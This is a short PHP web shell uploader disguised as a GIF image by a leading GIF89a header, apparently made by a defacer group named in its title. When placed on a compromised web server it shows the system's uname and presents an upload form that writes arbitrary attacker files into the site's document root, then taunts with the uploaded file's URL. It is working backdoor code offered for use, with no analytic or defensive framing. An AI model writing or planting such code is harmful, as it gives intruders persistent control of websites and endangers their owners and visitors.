GIF89a;<title>Fuckedz By En Banglasia</title>
<?php
echo "Priv8 Home Root Uploader by En Banglasia<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='Fuckedz'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['Fuckedz']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['Fuckedz']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Hey Idiots? Successfully! ==>> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "Hey Idiots? Failed Upload In Root Folder.";
        }
    } else {
        if(@copy($_FILES['Fuckedz']['tmp_name'], $files)) {
            echo "Hey Idiots? Successfully<b>$files</b> At This Folder";
        } else {
            echo "Hey Idiots? Failed!";
        }
    }
}
?>
